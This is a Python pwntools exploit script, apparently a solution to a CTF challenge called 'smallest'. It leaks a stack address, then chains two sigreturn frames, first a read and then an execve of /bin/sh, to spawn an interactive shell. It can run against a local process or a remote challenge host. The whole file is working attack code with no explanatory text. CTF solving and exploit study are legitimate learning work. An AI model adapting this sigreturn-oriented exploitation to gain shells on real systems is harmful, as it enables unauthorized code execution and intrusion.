#!/usr/bin/env python3

from pwn import *
from LibcSearcher import *

context(os = 'linux',arch = 'amd64',log_level = 'debug')

file_name = './smallest'
lib_name = ''
debug = 1
if debug:
    p = process(file_name)
    context.terminal = ['tmux','splitw','-h']
    gdb.attach(p)
else:
    ip = 'node5.buuoj.cn'
    port = ''
    p = remote(ip, port)
elf = ELF(file_name)
rop = ROP(file_name)
# libc = ELF(lib_name)


syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0


payload = p64(start_addr) * 3
input()
p.send(payload)
input()
p.send(b'\xb3')

stack_addr = u64(p.recv()[8:16])
print("stack_addr: ", hex(stack_addr))
read = SigreturnFrame()
read.rax = constants.SYS_read
read.rdi = 0
read.rsi = stack_addr
read.rdx = 0x400
read.rsp = stack_addr
read.rip = syscall_ret
payload = p64(start_addr) + p64(syscall_ret) + bytes(read)
input()
p.send(payload)
input()
p.send(payload[8:8+15])


execve = SigreturnFrame()
execve.rax = constants.SYS_execve
execve.rdi = stack_addr + 0x3f0
execve.rsi = 0x0
execve.rdx = 0x0
execve.rsp = stack_addr
execve.rip = syscall_ret

frame_payload = p64(start_addr) + p64(syscall_ret) + bytes(execve)
print(hex(len(frame_payload)))
payload = frame_payload + (0x3f0- len(frame_payload)) * b'\x00' + b'/bin/sh\x00'
input()
p.send(payload)
input()
p.send(payload[8:8+15])


p.interactive()

